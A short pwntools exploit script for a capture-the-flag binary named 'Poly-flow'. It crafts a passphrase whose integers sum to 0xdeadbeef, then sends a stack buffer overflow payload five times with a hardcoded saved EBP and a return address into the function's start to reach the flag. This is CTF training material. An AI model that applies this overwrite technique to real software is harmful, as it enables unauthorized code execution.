from pwn import * 

r = process('./Poly-flow')
context.log_level = 'debug'

#--------------------------------------------------
# to pass the first check

n = 0xdeadbeef
a = n // 4 + 1
b = n // 4 

a_str = a.to_bytes(4, 'little')
b_str = b.to_bytes(4, 'little')

passphrase = a_str * 3 + b_str 

r.recvuntil(b': ')
r.send(passphrase)

#--------------------------------------------------
# buffer overflow

# padding for overflow
padd = b"aaaabbbbccccddddeeeeffff"

# base address should not change
ebp = 0xffffcca8
ebp = ebp.to_bytes(4, 'little')

# do recursion by going back to begining of the function
addr = 0x8049860
addr = addr.to_bytes(4, 'little')

# send it five time to change variables value to 5 
# and pass the check to get the flag
for _ in range(5):
    r.send(padd + ebp + addr + b'\n')

# receive the flag
print(r.recv())
